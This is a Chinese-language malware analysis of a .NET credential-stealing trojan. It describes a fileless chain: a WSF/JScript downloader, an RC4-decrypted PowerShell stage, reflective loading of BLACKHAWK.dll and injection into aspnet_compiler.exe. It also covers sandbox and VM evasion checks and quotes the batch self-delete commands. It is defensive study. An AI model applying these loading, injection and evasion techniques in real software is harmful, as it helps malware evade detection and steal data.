.NET 窃密木马分析

一些基本概念：

  • CLI(Common Language Infrastructure,通用语言框架)：提供了一套可执行代码和它所运行需要的虚拟执行环境的规范.
  • CLR(Common Language Runtime,公共语言运行时)：和Java虚拟机一样也是一个运行时环境，负责资源管理(内存分配和垃圾收集)，并保证应用和底层操作系统之间必要的分离。
  • C++ /CLI：实现了C和.NET的无缝连接，可以使用C和C#混合的方式来完成应用程序代码的编写。
  • .NET程序编译运行流程：将源代码编译为微软中间语言MSIL，运行的时候即时编译为本地机器语言，同时.NET代码运行时有一个CLR环境来管理程序。

该木马前序有一个wsf（Windows Script File）脚本嵌入混淆 JScript 从网上落地一个powershell脚本并执行。

使用 RC4 算法解密内嵌脚本并执行，无磁盘文件落地。

脚本检查目标进程 aspnet_compiler.exe是否存在，将内嵌的 BLACKHAWK.dll 反射加载到当前 PowerShell 进程，调用 BLACKHAWK.DOWN::SHOOT()，把第二阶段 PE 字节注入到指定宿主进程 aspnet_compiler.exe。

脚本定义了 Invoke-ManagedAssembly：

  • 使用 [System.Reflection.Assembly]::Load($RawAssemblyBytes) 载入内嵌程序集
  • 用 GetType() 与 GetMethod() 查找公开静态方法
  • 调用 MethodInfo.Invoke($null, $MethodArguments)

SuspiciousGPU()

通过 WMI (Windows Management Instrumentation) 查询系统的 显卡 (GPU) 信息。

把实际 GPU 名称转换为小写，但名单中大量条目仍保留原始大小写。

SuspiciousProcess()虽然意图通过字符串匹配查询是否存在一些特殊进程，但是硬编码的字符串是大小写混合的，而 ProcessName 默认不包含 .exe，并且实际值还会被转成小写，该检测始终无法匹配。

SuspiciousService()

SandBox()

Emulator()通过时间检测判断是否进行加速。

SuspiciousIP()、SuspiciousPCName()、SuspiciousPCUsername()、SuspiciousMachineGuid()都是通过信息搜集进行的检查和判断。

任意一项命中后，调用 Stub.SelfDestruct::Melt()，其会在 %TEMP% 下写入随机 .bat

.bat 中包含：

  • taskkill /F /PID <当前进程>
  • timeout /T 2 /NOBREAK > NUL
  • del /F /Q "<bat路径>"

隐藏启动 cmd.exe /C

  • Thread.Sleep(5000)
  • Environment.FailFast(null)
